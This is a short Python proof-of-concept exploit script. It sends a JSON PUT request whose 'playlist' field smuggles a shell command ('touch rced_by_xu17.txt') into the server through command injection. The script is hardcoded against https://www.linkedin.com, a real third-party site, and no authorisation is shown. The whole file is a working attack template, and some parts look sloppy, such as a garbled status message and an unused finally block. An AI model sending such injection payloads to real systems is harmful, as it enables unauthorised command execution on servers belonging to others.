import json

import requests

TARGET = "https://www.linkedin.com"

INJECTED_COMMAND = "test';touch rced_by_xu17.txt;echo '"

payload = {"playlist": INJECTED_COMMAND, "shuffle": "True"}

# HTTP headers
headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}


def exploit():
    print("[+] Sending malicious JSON payload to trigger command injection>/..")
    try:
        response = requests.put(
            TARGET, headers=headers, data=json.dumps(payload), timeout=5
        )
        print(f"[+] HTTP Status Code: {response.status_code}")
        if response.status_code <= 400 and response.status_code >= 200:
            print(
                "[+] if the target is vulnerable, the command should be executed on the server."
            )
        else:
            print(f"[-] Exploit failed: {response.reason}")
            raise Exception(f"{TARGET} is so powerful failed to exploit")
    finally:
        pass


if __name__ == "__main__":
    exploit()
